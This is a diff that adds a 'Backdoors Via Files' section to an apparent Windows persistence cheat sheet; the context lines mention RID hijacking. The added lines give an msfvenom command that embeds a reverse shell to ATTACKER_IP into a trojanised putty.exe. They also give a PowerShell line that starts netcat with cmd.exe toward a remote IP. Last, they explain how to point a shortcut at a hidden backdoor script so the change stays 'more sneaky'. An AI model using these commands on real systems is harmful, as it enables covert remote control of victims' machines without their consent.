@@ -372,6 +372,20 @@ Edit F Value<br>
 Find RID value from registry and change it to F4 01 (500 in decimal)<br>
 
 
+# Backdoors Via Files
+## Replace Commonly Used Program (Eg. Putty.Exe) With Tampered Version:
+msfvenom -a x64 --platform windows -x putty.exe -k -p windows/x64/shell_reverse_tcp lhost=ATTACKER_IP lport=4444 -b "\x00" -f exe -o puttyX.exe<br>
+Edit Shortcut To Execute Mal Program<br>
+Create A Small Script To Execute Wanted Program With Our Backdoor<br>
+Store in Windows/System32/backdoor.ps1 for example<br>
+
+Start-Process -NoNewWindow "c:\tools\nc64.exe" "-e cmd.exe IP 4445"<br>
+
+C:\Windows\System32\calc.exe<br>
+### Edit Shortcut Target
+### Note: you may need to update the icon after this to be more sneaky.
+
+powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1<br>
 
 
 
